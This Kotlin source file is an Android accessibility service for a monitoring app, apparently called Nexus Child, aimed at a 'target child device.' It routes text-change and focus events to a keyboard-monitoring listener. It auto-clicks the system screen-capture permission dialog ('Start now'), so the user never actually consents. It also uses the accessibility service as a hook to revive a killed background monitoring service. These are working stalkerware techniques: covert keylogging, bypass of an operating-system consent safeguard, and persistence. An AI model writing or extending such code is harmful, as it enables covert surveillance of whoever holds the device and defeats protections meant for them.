package com.nexus.child.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.nexus.child.service.NexusBackgroundService

/**
 * NexusAccessibilityService provides system accessibility capabilities for Nexus Child.
 *
 * Hey friend! Here is why this service is fundamental:
 * 1. Enables remote automation on the target child device.
 * 2. Crucially intercepts the system-level MediaProjection permission dialog ("Start now" / "Entire screen")
 *    and delegates to MediaProjectionAutoClickHelper to autonomously click confirm.
 * 3. Registered with BIND_ACCESSIBILITY_SERVICE and @xml/accessibility_service_config so Android
 *    displays Nexus Child in the system Accessibility -> Downloaded apps settings screen.
 * 4. Lightweight event dispatching: offloads tree inspection with strict debouncing so the Android
 *    main thread and system_server never experience Binder IPC timeouts or ANRs.
 */
class NexusAccessibilityService : AccessibilityService() {

    /**
     * Listener interface for components interested in text input, keystrokes, and focus events.
     */
    interface IAccessibilityKeyboardListener {
        /**
         * Invoked on the main thread when an accessibility event matching text change, focus, or window state occurs.
         */
        fun onKeyboardAccessibilityEvent(event: AccessibilityEvent)
    }

    companion object {
        private const val TAG = "NexusAccessibility"

        @Volatile
        private var instance: NexusAccessibilityService? = null

        @Volatile
        private var keyboardListener: IAccessibilityKeyboardListener? = null

        /**
         * Registers or unregisters the active keyboard event listener.
         */
        fun setKeyboardEventListener(listener: IAccessibilityKeyboardListener?) {
            keyboardListener = listener
            Log.d(TAG, "Keyboard event listener " + if (listener != null) "attached" else "detached")
        }

        /**
         * Returns true if the service is currently bound and connected by Android OS.
         */
        fun isServiceRunning(): Boolean {
            return instance != null
        }

        /**
         * Returns the active service instance if connected.
         */
        fun getInstance(): NexusAccessibilityService? {
            return instance
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "NexusAccessibilityService connected and ready")
        ensureBackgroundServiceRunning()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // System keep-alive check: revive background monitoring if process was terminated
        ensureBackgroundServiceRunning()

        if (event == null) return

        // 1. Dispatch keyboard monitoring events if an active keyboard listener is attached
        keyboardListener?.let { listener ->
            try {
                val type = event.eventType
                if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                    type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                    type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                ) {
                    listener.onKeyboardAccessibilityEvent(event)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error dispatching accessibility event to keyboard listener: ${e.message}", e)
            }
        }

        // 2. MediaProjection auto-click handling (intercept "Start now" system dialog)
        if (MediaProjectionAutoClickHelper.isAutoClickEnabled()) {
            try {
                val type = event.eventType
                if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                ) {
                    val rootNode = event.source ?: rootInActiveWindow
                    MediaProjectionAutoClickHelper.tryAutoClick(rootNode, this)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error handling accessibility event for MediaProjection: ${e.message}", e)
            }
        }
    }

    /**
     * Checks if NexusBackgroundService is running and revives it if terminated.
     * Android system server keeps Accessibility Services permanently alive, making this
     * a powerful resurrection hook.
     */
    private fun ensureBackgroundServiceRunning() {
        try {
            if (!NexusBackgroundService.isRunning()) {
                Log.d(TAG, "NexusBackgroundService not running. Reviving from AccessibilityService...")
                NexusBackgroundService.start(applicationContext)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to revive background service from accessibility: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "NexusAccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) {
            instance = null
        }
        Log.d(TAG, "NexusAccessibilityService destroyed")
    }
}
